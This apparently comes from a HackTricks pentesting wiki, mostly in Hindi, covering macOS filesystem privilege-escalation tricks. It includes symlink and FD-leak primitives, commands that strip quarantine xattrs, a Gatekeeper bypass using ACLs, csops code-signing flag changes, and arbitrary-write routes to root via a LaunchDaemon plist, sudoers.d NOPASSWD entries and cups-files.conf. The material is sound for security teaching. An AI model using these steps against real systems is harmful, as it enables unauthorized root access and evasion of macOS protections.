# macOS FS Tricks

{{#include ../../../../banners/hacktricks-training.md}}

## POSIX permissions combinations

एक **directory** के लिए, तीन permission bits का अर्थ regular file से अलग होता है। `chmod(1)` directory पर लागू होने पर execute bit को "**search**" कहता है:<sup>[[2]](#references)</sup>

> `0100` Files के लिए, owner द्वारा execution की अनुमति देता है। Directories के लिए, owner को directory में **search** करने की अनुमति देता है।

- **read** - आप directory entries को **enumerate** कर सकते हैं (नामों की list देख सकते हैं)।
- **write** - आप directory में entries को **create, rename और delete** कर सकते हैं। ध्यान दें कि यह *containing* directory की property है, file की नहीं: यदि आप उसकी parent directory में write कर सकते हैं, तो आप ऐसी file को delete कर सकते हैं जिसे आप read या write नहीं कर सकते।
- किसी **subdirectory** को delete करने के लिए उसका empty होना आवश्यक है, जिसके लिए उसके अंदर की सभी चीजों को हटाने के लिए पर्याप्त rights चाहिए।
- यदि directory में **sticky bit** (`S_ISVTX`, जैसे `/tmp`) है, तो यह प्रतिबंधित होता है — POSIX के अनुसार कोई process उसमें files को केवल तभी remove या rename कर सकता है जब वह file का owner हो, directory का owner हो, या उसके पास appropriate privileges हों।<sup>[[1]](#references)</sup>
- **execute / search** - आपको directory को **traverse** करने की अनुमति है। Pathname resolution प्रत्येक component को "उसके predecessor द्वारा specified directory में" locate करता है, इसलिए path prefix के किसी एक component पर **search rights खोने से उसके नीचे की हर चीज path द्वारा unreachable हो जाती है**, भले ही leaf file स्वयं world-readable हो।<sup>[[1]](#references)</sup>

### Dangerous Combinations

**root के ownership वाली file/folder को overwrite करने के तरीके**, लेकिन:

- Path में एक parent **directory owner** user है
- Path में एक parent **directory owner** ऐसा **users group** है जिसके पास **write access** है
- किसी users **group** के पास **file** पर **write** access है

पिछले combinations में से किसी के साथ, attacker expected path में एक **sym/hard link** **inject** करके privileged arbitrary write प्राप्त कर सकता है।

### Folder root R+X special case

यह ऊपर दिए गए pathname-resolution rule से सीधे स्पष्ट होता है। यदि कोई **directory केवल root को R+X देती है**, तो उसके अंदर की files बाकी सभी के लिए *path द्वारा* unreachable होती हैं — लेकिन **files' own permission bits फिर भी permissive हो सकते हैं**। रुकावट केवल directory है।

इसलिए कोई भी primitive जो आपको file को उस directory से **बाहर निकालने** देता है — जैसे कोई privileged process attacker द्वारा चुने गए path को ऐसी location में **moves/renames/copies** करता है जिसे आप traverse कर सकते हैं — arbitrary read में बदल जाता है, और file के अपने mode को defeat करने की कभी आवश्यकता नहीं पड़ती:
```bash
# Reproduce the primitive locally
sudo mkdir -p /tmp/locked && sudo chmod 700 /tmp/locked
sudo sh -c 'echo secret > /tmp/locked/data.txt; chmod 644 /tmp/locked/data.txt'

ls -l /tmp/locked/data.txt   # Permission denied: cannot even stat through the directory
cat /tmp/locked/data.txt     # Permission denied

# The file itself is mode 644 - only the parent directory's search bit blocks you.
sudo ls -l /tmp/locked/
```
ऐसे privileged file movers (installers, log rotators, crash/diagnostic collectors, backup और "export" features) खोजें जो lower-privileged user से source path स्वीकार करते हों।

## Symbolic Link / Hard Link

### Permissive file/folder

यदि कोई privileged process ऐसे **file** में data लिख रहा है जिसे कोई **lower privileged user** **controlled** कर सकता है, या जिसे पहले किसी lower privileged user ने **created** किया हो। User उसे Symbolic या Hard link के माध्यम से **दूसरी file पर point** कर सकता है, और privileged process उस file में लिखेगा।

अन्य sections में देखें कि attacker privileges escalate करने के लिए **arbitrary write का abuse** कैसे कर सकता है।

### Open `O_NOFOLLOW`

[`open(2)`](https://keith.github.io/xcode-man-pages/open.2.html) के अनुसार: *"यदि mask में `O_NOFOLLOW` का उपयोग किया गया है और `open()` को दी गई target file symbolic link है, तो `open()` fail हो जाएगा।"* केवल **final** component की जाँच की जाती है — प्रत्येक **intermediate** component अभी भी resolve और follow होता है। इसलिए ऐसा developer जिसने `O_NOFOLLOW` से write को "protected" किया हो, target path की किसी भी **parent directory** में symlink रखकर फिर भी attack किया जा सकता है।<sup>[[3]](#references)</sup>

उसी man page में वे flags भी documented हैं जो वास्तव में इस gap को बंद करते हैं:<sup>[[3]](#references)</sup>

- **`O_NOFOLLOW_ANY`** — *"यदि ... `open()` को दिए गए path का कोई भी component symbolic link है, तो `open()` fail हो जाएगा।"*
- **`O_RESOLVE_BENEATH`** — *"यदि ... specified path resolution उस fd से associated directory से बाहर निकलता है, तो `openat()` fail हो जाएगा।"*

अन्यथा, ऐसे directory FD के relative `openat()` का उपयोग करें जिसे आपने पहले validate किया हो, या mid-path symlink swaps को रोकने के लिए `realpath()` + re-validation करें।

## .fileloc

**`.fileloc`** extension वाली files अन्य applications या binaries की ओर point कर सकती हैं, इसलिए जब वे open की जाती हैं, तो वही application/binary execute होगी।\
उदाहरण:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>URL</key>
<string>file:///System/Applications/Calculator.app</string>
<key>URLPrefix</key>
<integer>0</integer>
</dict>
</plist>
```
## File Descriptors

### Leak FD (no `O_CLOEXEC`)

यदि `open` call में `O_CLOEXEC` flag नहीं है, तो file descriptor child process को inherit हो जाएगा। इसलिए, यदि कोई privileged process किसी privileged file को खोलता है और attacker द्वारा नियंत्रित process को execute करता है, तो attacker **privileged file का FD inherit कर लेगा**।

इसका canonical example **`DYLD_PRINT_TO_FILE` LPE in OS X 10.10** ([SektionEins](https://www.sektioneins.de/en/blog/15-07-07-dyld_print_to_file_lpe.html)):<sup>[[4]](#references)</sup>

- `dyld` ने **restricted (suid root) binaries** में भी `DYLD_PRINT_TO_FILE=/path` को स्वीकार किया, क्योंकि उस particular variable को `processDyldEnvironmentVariable()` के बाहर parse किया गया था।
- इसने `open(loggingPath, O_WRONLY | O_CREAT | O_APPEND, 0644)` execute किया, इसलिए इसने किसी भी arbitrary path पर **root-owned file create की**।
- FD को **कभी close नहीं किया गया और उसमें close-on-exec flag नहीं था**, इसलिए suid binary की हर child को **root-owned file का writable FD inherit हुआ**।
- उदाहरण के लिए `DYLD_PRINT_TO_FILE=/etc/target suid_binary` चलाने और फिर child में inherited FD number पढ़ने से arbitrary root-owned writes संभव हुए; `fcntl(fd, F_SETFL, 0)` ने `O_APPEND` को clear करके append करने के बजाय overwrite करने की अनुमति भी दी।

यही pattern तब भी दिखाई देता है जब कोई privileged process आपके नियंत्रण वाली किसी चीज़ को `exec` करने से **पहले** कोई file खोलता है (helper tools, `$EDITOR` के माध्यम से invoke किए गए `crontab`-style editors, env-var path से खोली गई log/debug files...). आपके द्वारा inherit किए गए FDs को इस command से enumerate करें:
```bash
# From inside the child process
ls -l /dev/fd/
# or
lsof -p $$
```
`2` से ऊपर कोई भी ऐसी चीज़, जो उस फ़ाइल की ओर संकेत करती है जिसे आप स्वयं खोल नहीं सकते, एक arbitrary-write (या arbitrary-read) primitive है।

## quarantine xattrs tricks से बचें

### इसे हटाएँ
```bash
xattr -d com.apple.quarantine /path/to/file_or_app
```
### uchg / uchange / uimmutable flag

यदि किसी file/folder में यह immutable attribute है, तो उस पर xattr लगाना संभव नहीं होगा.
```bash
echo asd > /tmp/asd
chflags uchg /tmp/asd # "chflags uchange /tmp/asd" or "chflags uimmutable /tmp/asd"
xattr -w com.apple.quarantine "" /tmp/asd
xattr: [Errno 1] Operation not permitted: '/tmp/asd'

ls -lO /tmp/asd
# check the "uchg" in the output
```
### xattr support के बिना file systems

macOS जिन सभी file systems को mount कर सकता है, उनमें **extended attributes** को native रूप से store करने की सुविधा नहीं होती। HFS+ और APFS में यह सुविधा होती है; **FAT32, exFAT और (अधिकांश) NFS mounts में नहीं** — macOS इन्हें `._<filename>` नाम वाली **AppleDouble** side file में लिखकर emulate करता है ([The Eclectic Light Company](https://eclecticlight.co/2018/01/12/which-file-systems-and-cloud-services-preserve-extended-attributes/)).<sup>[[5]](#references)</sup>

यह quarantine के लिए महत्वपूर्ण है, क्योंकि xattr केवल तभी सुरक्षित रहता है जब उसे उसी volume से वास्तव में लिखा **और वापस पढ़ा** जा सके:
```bash
# Check whether a mount point round-trips xattrs at all
xattr -w com.apple.quarantine "0081;00000000;test;" /Volumes/SOMEUSB/file
xattr -p com.apple.quarantine /Volumes/SOMEUSB/file
ls -a /Volumes/SOMEUSB/          # look for the ._file AppleDouble companion
```
यदि volume को बाद में ऐसे path पर पढ़ा जाता है जो `._` companion को अनदेखा करता है (या companion को हटा दिया जाता है), तो file **बिना quarantine flag के** पहुंचती है — और एक unquarantined `.app` App Sandbox से बाहर निकलने के लिए पर्याप्त है, जैसा कि [macOS Sandbox Debug & Bypass](../macos-sandbox/macos-sandbox-debug-and-bypass/README.md#bypassing-quarantine-attribute) में बताया गया है।

### writeextattr ACL

यह ACL file में `xattrs` जोड़ने से रोकता है
```bash
rm -rf /tmp/test*
echo test >/tmp/test
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" /tmp/test
ls -le /tmp/test
ditto -c -k test test.zip
# Download the zip from the browser and decompress it, the file should be without a quarantine xattr

cd /tmp
echo y | rm test

# Decompress it with ditto
ditto -x -k --rsrc test.zip .
ls -le /tmp/test

# Decompress it with open (if sandboxed decompressed files go to the Downloads folder)
open test.zip
sleep 1
ls -le /tmp/test
```
### **com.apple.acl.text xattr + AppleDouble**

**AppleDouble** file format किसी file को उसके ACEs सहित copy करता है।

[**source code**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html) में यह देखा जा सकता है कि **`com.apple.acl.text`** नामक xattr के अंदर stored ACL text representation को decompressed file में ACL के रूप में set किया जाएगा। इसलिए, यदि आपने किसी application को **AppleDouble** file format के साथ एक zip file में compress किया, जिसमें ऐसा ACL हो जो अन्य xattrs को उसमें लिखे जाने से रोकता हो... तो application में quarantine xattr set नहीं किया गया:

अधिक जानकारी के लिए [**original report**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/) देखें।<sup>[[6]](#references)</sup>

इसे replicate करने के लिए हमें पहले सही acl string प्राप्त करनी होगी:
```bash
# Everything will be happening here
mkdir /tmp/temp_xattrs
cd /tmp/temp_xattrs

# Create a folder and a file with the acls and xattr
mkdir del
mkdir del/test_fold
echo test > del/test_fold/test_file
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold/test_file
ditto -c -k del test.zip

# uncomporess to get it back
ditto -x -k --rsrc test.zip .
ls -le test
```
(ध्यान दें कि भले ही यह काम करे, sandbox पहले quarantine xattr लिखता है)

वास्तव में इसकी आवश्यकता नहीं है, लेकिन केवल सावधानी के लिए इसे यहाँ छोड़ रहा हूँ:


{{#ref}}
macos-xattr-acls-extra-stuff.md
{{#endref}}

## Bypass signature checks

### Bypass platform binaries checks

कुछ security checks यह जाँचते हैं कि binary एक **platform binary** है या नहीं, उदाहरण के लिए किसी XPC service से connect करने की अनुमति देने के लिए। हालाँकि, जैसा कि https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/ में bypass पर बताया गया है, किसी platform binary (जैसे /bin/ls) को प्राप्त करके और `DYLD_INSERT_LIBRARIES` environment variable का उपयोग करके dyld के माध्यम से exploit inject करके इस check को bypass करना संभव है।<sup>[[7]](#references)</sup>

### Bypass flags `CS_REQUIRE_LV` and `CS_FORCED_LV`

किसी executing binary के लिए अपने flags को modify करके checks को bypass करना संभव है, जैसा कि इस code से किया जा सकता है:<sup>[[7]](#references)</sup>
```c
// Code from https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/
int pid = getpid();
NSString *exePath = NSProcessInfo.processInfo.arguments[0];

uint32_t status = SecTaskGetCodeSignStatus(SecTaskCreateFromSelf(0));
status |= 0x2000; // CS_REQUIRE_LV
csops(pid, 9, &status, 4); // CS_OPS_SET_STATUS

status = SecTaskGetCodeSignStatus(SecTaskCreateFromSelf(0));
NSLog(@"=====Inject successfully into %d(%@), csflags=0x%x", pid, exePath, status);
```
## Bypass Code Signatures

Bundles में **`_CodeSignature/CodeResources`** फ़ाइल होती है, जिसमें **bundle** की प्रत्येक **file** का **hash** होता है। ध्यान दें कि CodeResources का hash भी **executable** में **embedded** होता है, इसलिए हम उसमें भी छेड़छाड़ नहीं कर सकते।

हालाँकि, कुछ ऐसी files हैं जिनकी signature check नहीं की जाएगी। इनमें plist में `omit` key होती है, जैसे:
```xml
<dict>
...
<key>rules</key>
<dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
<key>rules2</key>
...
<key>^(.*/index.html)?\.DS_Store$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>2000</real>
</dict>
...
<key>^PkgInfo$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>20</real>
</dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
```
CLI से किसी resource का signature इस प्रकार calculate किया जा सकता है:
```bash
openssl dgst -binary -sha1 /System/Cryptexes/App/System/Applications/Safari.app/Contents/Resources/AppIcon.icns | openssl base64
```
## Mount dmgs

एक user द्वारा बनाया गया custom dmg कुछ मौजूदा folders के ऊपर भी mount किया जा सकता है। इस तरह आप custom content वाला custom dmg package बना सकते हैं:
```bash
# Create the volume
hdiutil create /private/tmp/tmp.dmg -size 2m -ov -volname CustomVolName -fs APFS 1>/dev/null
mkdir /private/tmp/mnt

# Mount it
hdiutil attach -mountpoint /private/tmp/mnt /private/tmp/tmp.dmg 1>/dev/null

# Add custom content to the volume
mkdir /private/tmp/mnt/custom_folder
echo "hello" > /private/tmp/mnt/custom_folder/custom_file

# Detach it
hdiutil detach /private/tmp/mnt 1>/dev/null

# Next time you mount it, it will have the custom content you wrote

# You can also create a dmg from an app using:
hdiutil create -srcfolder justsome.app justsome.dmg
```
Usually macOS `/usr/libexec/diskarbitrationd` द्वारा प्रदान की जाने वाली `com.apple.DiskArbitrarion.diskarbitrariond` Mach service से बात करके disk mount करता है। यदि LaunchDaemons plist file में `-d` param जोड़कर इसे restart किया जाए, तो यह logs को `/var/log/diskarbitrationd.log` में store करेगा।\
हालांकि, `com.apple.driver.DiskImages` kext से सीधे communicate करने के लिए `hdik` और `hdiutil` जैसे tools का उपयोग करना संभव है।

## Arbitrary Writes

### Periodic sh scripts

यदि आपकी script को **shell script** के रूप में interpret किया जा सकता है, तो आप **`/etc/periodic/daily/999.local`** shell script को overwrite कर सकते हैं, जो हर दिन trigger होगी।

आप इस script के execution को इस command से **fake** कर सकते हैं: **`sudo periodic daily`**

### Daemons

**`/Library/LaunchDaemons/xyz.hacktricks.privesc.plist`** जैसी arbitrary **LaunchDaemon** को plist के साथ write करें, जिसमें इस तरह की arbitrary script execute हो:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.sample.Load</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Scripts/privesc.sh</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
बस `/Applications/Scripts/privesc.sh` script को उन **commands** के साथ generate करें जिन्हें आप root के रूप में चलाना चाहते हैं।

### Sudoers File

यदि आपके पास **arbitrary write** है, तो आप `/etc/sudoers.d/` folder के अंदर एक file बनाकर स्वयं को **sudo** privileges प्रदान कर सकते हैं।

### PATH files

`/etc/paths` file उन मुख्य स्थानों में से एक है जो PATH env variable को populate करते हैं। इसे overwrite करने के लिए आपका root होना आवश्यक है, लेकिन यदि **privileged process** की कोई script **full path** के बिना कोई **command** execute कर रही है, तो आप इस file को modify करके उसे **hijack** कर सकते हैं।

आप `PATH` env variable में नए folders load करने के लिए `/etc/paths.d` में files भी लिख सकते हैं।

### cups-files.conf

इस technique का उपयोग [इस writeup](https://www.kandji.io/blog/macos-audit-story-part1) में किया गया था।<sup>[[8]](#references)</sup>

निम्नलिखित content वाली `/etc/cups/cups-files.conf` file बनाएं:
```
ErrorLog /etc/sudoers.d/lpe
LogFilePerm 777
<some junk>
```
यह `/etc/sudoers.d/lpe` फ़ाइल को 777 permissions के साथ बनाएगा। अंत में मौजूद अतिरिक्त junk error log creation को trigger करने के लिए है।

फिर, `/etc/sudoers.d/lpe` में privileges escalate करने के लिए आवश्यक config लिखें, जैसे `%staff ALL=(ALL) NOPASSWD:ALL`।

इसके बाद `/etc/cups/cups-files.conf` को फिर से संशोधित करें और `LogFilePerm 700` निर्दिष्ट करें, ताकि नई sudoers फ़ाइल `cupsctl` को invoke करने पर valid हो जाए।

### Sandbox Escape

FS arbitrary write के ज़रिए macOS sandbox से escape करना posisble है। कुछ examples के लिए [macOS Auto Start](../../../../macos-auto-start-locations.md) पेज देखें, लेकिन एक सामान्य तरीका यह है कि `~/Library/Preferences/com.apple.Terminal.plist` में ऐसी Terminal preferences फ़ाइल लिखी जाए जो startup पर कोई command execute करे, और फिर उसे `open` का उपयोग करके call किया जाए।

## अन्य users के रूप में writable files generate करना

एक बहुत सामान्य privesc primitive यह है कि **privileged process से आपके लिए किसी ऐसे directory में फ़ाइल create करवाई जाए** जिसे आप control करते हैं, और फिर उस फ़ाइल पर **write access** बनाए रखा जाए। इसके लिए दो चीज़ें आवश्यक हैं:

1. आपके ownership वाला directory (या ऐसा directory जहाँ आप **inheritable ACL** set कर सकें), ताकि उसके अंदर create होने वाली हर चीज़ आपकी permissions inherit करे।
2. ऐसा privileged/`suid` process जिसे **कहाँ** फ़ाइल create करनी है, यह बताया जा सके — आमतौर पर किसी debug/logging environment variable, config file या helper के XPC API के ज़रिए।

**Inheritable ACL** वाला भाग यह सुनिश्चित करता है कि बनाई गई फ़ाइल आपके लिए writable हो, भले ही उसका ownership किसी अन्य user के पास हो। `file_inherit` / `directory_inherit` inheritance flags [`chmod(1)`](https://keith.github.io/xcode-man-pages/chmod.1.html) में documented हैं:<sup>[[2]](#references)</sup>
```bash
DIRNAME=/tmp/inherit_test
mkdir -p "$DIRNAME"

# file_inherit + directory_inherit => everything created inside is writable by me
chmod +a "$(whoami) allow read,write,append,execute,readattr,writeattr,readextattr,writeextattr,chown,delete,writesecurity,readsecurity,list,search,add_file,add_subdirectory,delete_child,file_inherit,directory_inherit" "$DIRNAME"

ls -lde "$DIRNAME"   # confirm the ACE is present
```
अब कोई भी privileged process जो `$DIRNAME` के अंदर file बनाता है, वह **आपके द्वारा writable** होगी। यदि वह directory ऐसी location भी है जिसे बाद में **root के रूप में execute** किया जाता है (`/etc/periodic/*`, `/etc/cron.d`, `/etc/sudoers.d`, कोई LaunchDaemon directory...), तो यह सीधे root escalation की ओर ले जाता है। File मिल जाने के बाद उसमें क्या लिखना है, इसके लिए ऊपर दिए गए [Sudoers File](#sudoers-file) और [cups-files.conf](#cups-filesconf) sections देखें।

"env variable makes a root process create a file, and the FD leaks to you" chain के पूरे worked example के लिए ऊपर दिया गया [Leak FD (no `O_CLOEXEC`)](#leak-fd-no-o_cloexec) देखें।

## POSIX Shared Memory

**POSIX shared memory** POSIX-compliant operating systems में processes को एक common memory area access करने की अनुमति देता है, जिससे अन्य inter-process communication methods की तुलना में तेज communication संभव होती है। इसमें `shm_open()` के साथ shared memory object बनाना या खोलना, `ftruncate()` के साथ उसका size निर्धारित करना, और `mmap()` का उपयोग करके उसे process के address space में map करना शामिल है। इसके बाद processes इस memory area से सीधे read और write कर सकते हैं। Concurrent access को manage करने और data corruption को रोकने के लिए अक्सर mutexes या semaphores जैसे synchronization mechanisms का उपयोग किया जाता है। अंत में, processes `munmap()` और `close()` के साथ shared memory को unmap और close करते हैं, और वैकल्पिक रूप से `shm_unlink()` के साथ memory object को remove कर सकते हैं। यह system उन environments में efficient और fast IPC के लिए विशेष रूप से प्रभावी है, जहाँ multiple processes को shared data को तेजी से access करने की आवश्यकता होती है।

<details>

<summary>Producer Code Example</summary>
```c
// gcc producer.c -o producer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
const char *name = "/my_shared_memory";
const int SIZE = 4096; // Size of the shared memory object

// Create the shared memory object
int shm_fd = shm_open(name, O_CREAT | O_RDWR, 0666);
if (shm_fd == -1) {
perror("shm_open");
return EXIT_FAILURE;
}

// Configure the size of the shared memory object
if (ftruncate(shm_fd, SIZE) == -1) {
perror("ftruncate");
return EXIT_FAILURE;
}

// Memory map the shared memory
void *ptr = mmap(0, SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, shm_fd, 0);
if (ptr == MAP_FAILED) {
perror("mmap");
return EXIT_FAILURE;
}

// Write to the shared memory
sprintf(ptr, "Hello from Producer!");

// Unmap and close, but do not unlink
munmap(ptr, SIZE);
close(shm_fd);

return 0;
}
```
</details>

<details>

<summary>उपभोक्ता कोड उदाहरण</summary>
```c
// gcc consumer.c -o consumer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
const char *name = "/my_shared_memory";
const int SIZE = 4096; // Size of the shared memory object

// Open the shared memory object
int shm_fd = shm_open(name, O_RDONLY, 0666);
if (shm_fd == -1) {
perror("shm_open");
return EXIT_FAILURE;
}

// Memory map the shared memory
void *ptr = mmap(0, SIZE, PROT_READ, MAP_SHARED, shm_fd, 0);
if (ptr == MAP_FAILED) {
perror("mmap");
return EXIT_FAILURE;
}

// Read from the shared memory
printf("Consumer received: %s\n", (char *)ptr);

// Cleanup
munmap(ptr, SIZE);
close(shm_fd);
shm_unlink(name); // Optionally unlink

return 0;
}

```
</details>

## macOS Guarded Descriptors

**macOSCguarded descriptors** macOS में शुरू किया गया एक security feature है, जो user applications में **file descriptor operations** की सुरक्षा और reliability बढ़ाता है। ये guarded descriptors file descriptors के साथ विशिष्ट restrictions या "guards" जोड़ने का तरीका प्रदान करते हैं, जिन्हें kernel लागू करता है।

यह feature विशेष रूप से **unauthorized file access** या **race conditions** जैसी security vulnerabilities की कुछ श्रेणियों को रोकने के लिए उपयोगी है। ये vulnerabilities तब उत्पन्न होती हैं, जब उदाहरण के लिए कोई thread किसी file description को access कर रहा हो और **किसी अन्य vulnerable thread को उस पर access दे रहा हो**, या जब कोई file descriptor किसी vulnerable child process द्वारा **inherited** हो। इस functionality से संबंधित कुछ functions हैं:

- `guarded_open_np`: guard के साथ FD खोलता है
- `guarded_close_np`: इसे बंद करता है
- `change_fdguard_np`: किसी descriptor पर guard flags बदलता है (guard protection हटाना भी संभव है)

## References

- [1] [POSIX.1-2024 — Base Definitions, Ch. 4 (File Access Permissions, Directory Protection, Pathname Resolution)](https://pubs.opengroup.org/onlinepubs/9799919799/basedefs/V1_chap04.html)
- [2] [`chmod(1)` man page](https://keith.github.io/xcode-man-pages/chmod.1.html) (directory search/execute bit, ACL inheritance flags)
- [3] [`open(2)` man page](https://keith.github.io/xcode-man-pages/open.2.html) (`O_NOFOLLOW`, `O_NOFOLLOW_ANY`, `O_RESOLVE_BENEATH`)
- [4] [SektionEins - OS X 10.10 DYLD_PRINT_TO_FILE Local Privilege Escalation](https://www.sektioneins.de/en/blog/15-07-07-dyld_print_to_file_lpe.html) (close-on-exec के बिना leaked FD)
- [5] [The Eclectic Light Company - Which file systems and cloud services preserve extended attributes?](https://eclecticlight.co/2018/01/12/which-file-systems-and-cloud-services-preserve-extended-attributes/)
- [6] [Microsoft - Gatekeeper's Achilles heel: unearthing a macOS vulnerability](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/)
- [7] [Mickey (Jhftss) - A New Era of macOS Sandbox Escapes](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/)
- [8] [Kandji - Uncovering Apple Vulnerabilities: The diskarbitrationd and storagekitd Audit Story Part 1](https://www.kandji.io/blog/macos-audit-story-part1)

{{#include ../../../../banners/hacktricks-training.md}}
